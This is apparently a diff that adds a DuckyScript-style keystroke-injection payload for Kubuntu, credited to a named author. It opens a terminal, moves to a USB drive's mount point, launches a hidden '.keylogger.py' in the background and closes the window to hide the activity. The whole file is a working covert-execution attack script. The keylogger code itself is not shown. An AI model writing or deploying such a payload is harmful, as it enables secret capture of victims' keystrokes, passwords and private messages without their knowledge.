@@ -1,0 +1,17 @@
+REM Author : Gwendoline Dossegger
+REM Launch the keylogger on Linux (Kubuntu)
+REM access to the mass storage and run the keylogger
+ALT ESPACE
+DELAY 1000
+STRING Konsole
+DELAY 1000
+ENTER
+DELAY 1000
+STRING cd /media/$USER/0FAB-5CE3/
+DELAY 1000
+ENTER
+STRING python3 .keylogger.py &
+DELAY 1000
+ENTER
+DELAY 2000
+ALT F4
